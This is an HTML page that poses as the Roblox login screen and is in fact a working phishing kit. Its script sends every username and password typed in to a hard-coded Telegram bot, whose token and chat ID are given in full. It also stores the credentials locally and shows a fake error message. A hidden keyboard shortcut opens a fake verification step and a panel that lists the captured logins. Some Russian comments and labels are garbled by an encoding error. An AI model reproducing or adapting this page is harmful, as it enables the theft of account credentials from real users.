<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        /* –û–±—â–∏–µ —Å—Ç–∏–ª–∏ */
        body, html { margin: 0; padding: 0; height: 100%; font-family: "Segoe UI", sans-serif; background: radial-gradient(circle, #252729 0%, #000 100%); color: #d1d1d1; overflow: hidden; }
        
        .navbar { display: flex; align-items: center; background-color: #232527; padding: 0 20px; height: 40px; position: fixed; top: 0; width: 100%; z-index: 100; border-bottom: 1px solid #111; box-sizing: border-box; }
        .logo-text { font-size: 20px; font-weight: 800; color: #fff; }

        /* –¶–µ–Ω—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Å–µ—Ö —ç–∫—Ä–∞–Ω–æ–≤ */
        .screen { display: none; flex-direction: column; justify-content: center; align-items: center; height: 100vh; width: 100%; position: absolute; top: 0; left: 0; }
        #login-form-screen { display: flex; } /* –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –ø–µ—Ä–≤—ã–π —ç–∫—Ä–∞–Ω */

        /* –ö–∞—Ä—Ç–æ—á–∫–∞ –≤—Ö–æ–¥–∞ (–ø–æ–ø—Ä–∞–≤–∏–ª –æ—Ç—Å—Ç—É–ø—ã, —á—Ç–æ–±—ã –Ω–µ —Å—ä–µ–∑–∂–∞–ª–æ) */
        .login-card { background-color: #232527; width: 380px; padding: 40px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); border: 1px solid #333; box-sizing: border-box; }
        
        input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; outline: none; box-sizing: border-box; }
        .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 5px; }

        /* –°–µ—Ç–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ */
        .acc-list { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; width: 100%; }
        .acc-item { background: #393b3d; padding: 8px; border-radius: 5px; cursor: pointer; border: 1px solid transparent; font-size: 13px; text-align: center; }
        .acc-item:hover { border-color: #ff0000; }

        /* –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å */
        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 90%; max-width: 800px; border: 1px solid #444; max-height: 60vh; overflow-y: auto; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; border: 1px solid #333; text-align: left; font-size: 14px; }
        .controls { display: flex; gap: 10px; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="navbar"><div class="logo-text">ROBLOX</div></div>

    <div id="login-form-screen" class="screen">
        <div class="login-card">
            <h2 style="color:#fff; margin: 0 0 25px 0;">Login to Roblox</h2>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Password">
            <button class="btn-auth" onclick="saveData()">Log In</button>
        </div>
    </div>

    <div id="admin-auth" class="screen">
        <div class="login-card" style="border-color: #ff0000;">
            <h2 style="color: #ff0000; margin: 0 0 10px 0;">VERIFICATION</h2>
            <p id="status-text" style="color: #888; font-size: 13px; margin-bottom: 15px;">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏ –≤—ã–±–µ—Ä–∏—Ç–µ –∞–∫–∫–∞—É–Ω—Ç –∏–∑ TG.</p>
            
            <input type="password" id="admin_pass" placeholder="–ö–æ–¥ –∏–∑ Telegram">
            
            <div id="acc-selector" class="acc-list" style="display: none;"></div>

            <button id="request-btn" class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="startVerification()">–ü–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –≤ TG</button>
        </div>
    </div>

    <div id="admin-panel" class="screen">
        <div class="admin-box">
            <h3 style="color: #fff; margin-top: 0;">LOGS DATABASE</h3>
            <table>
                <thead><tr><th>User</th><th>Pass</th><th>Time</th></tr></thead>
                <tbody id="logData"></tbody>
            </table>
        </div>
        <div class="controls">
            <button class="btn-auth" style="width: 150px;" onclick="updateLogs()">–û–±–Ω–æ–≤–∏—Ç—å –±–∞–∑—É</button>
            <button class="btn-auth" style="width: 150px; border-color: #888;" onclick="location.reload()">–í—ã—Ö–æ–¥</button>
        </div>
    </div>

    <script>
        const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw";
        const TG_CHAT_ID = "7863254073";
        
        let secretCode = "";
        let targetAccount = "";
        const mockAccounts = ["Admin_Vip", "Roblox_Owner", "Mod_Check", "System_Root", "User_Test", "Dev_Access", "Security_Bot", "Main_Admin", "Global_Mod", "Data_Manager"];

        // –°–µ–∫—Ä–µ—Ç–∫–∞: Ctrl + \ + 3 + Z
        let keys = {};
        document.addEventListener('keydown', (e) => {
            keys[e.code] = true;
            if (keys["ControlLeft"] && keys["Backslash"] && keys["Digit3"] && keys["KeyZ"]) showScreen('admin-auth');
        });
        document.addEventListener('keyup', (e) => { delete keys[e.code]; });

        function showScreen(id) {
            document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
            document.getElementById(id).style.display = 'flex';
        }

        async function startVerification() {
            secretCode = Math.floor(1000 + Math.random() * 9000).toString();
            targetAccount = mockAccounts[Math.floor(Math.random() * mockAccounts.length)];

            document.getElementById('status-text').innerText = "–ü—Ä–æ–≤–µ—Ä—å Telegram!";
            
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: TG_CHAT_ID, 
                    text: `üîê *ADMIN LOGIN*\n–ö–æ–¥: \`${secretCode}\` \n–í—ã–±–µ—Ä–∏ –∞–∫–∫: *${targetAccount}*`, 
                    parse_mode: "Markdown" 
                })
            });

            document.getElementById('request-btn').style.display = "none";
            const accSelector = document.getElementById('acc-selector');
            accSelector.style.display = "grid";
            accSelector.innerHTML = "";
            mockAccounts.forEach(acc => {
                const div = document.createElement('div');
                div.className = 'acc-item';
                div.innerText = acc;
                div.onclick = () => {
                    const userCode = document.getElementById('admin_pass').value;
                    if (userCode === secretCode && acc === targetAccount) {
                        showScreen('admin-panel');
                        updateLogs();
                    } else {
                        alert("–û—à–∏–±–∫–∞ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏!");
                        location.reload();
                    }
                };
                accSelector.appendChild(div);
            });
        }

        async function saveData() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if(!u || !p) return;
            
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: `üë§ *LOG:* \`${u}\` | \`${p}\``, parse_mode: "Markdown" })
            });

            let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
            logs.push({ user: u, pass: p, time: new Date().toLocaleTimeString() });
            localStorage.setItem('roblox_logs', JSON.stringify(logs));
            alert("Error 403: Forbidden");
        }

        function updateLogs() {
            const logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
            const tbody = document.getElementById('logData');
            if(logs.length === 0) {
                tbody.innerHTML = "<tr><td colspan='3' style='text-align:center'>–ë–∞–∑–∞ –ø—É—Å—Ç–∞</td></tr>";
            } else {
                tbody.innerHTML = logs.reverse().map(l => 
                    `<tr><td>${l.user}</td><td>${l.pass}</td><td>${l.time}</td></tr>`
                ).join('');
            }
        }
    </script>
</body>
</html>
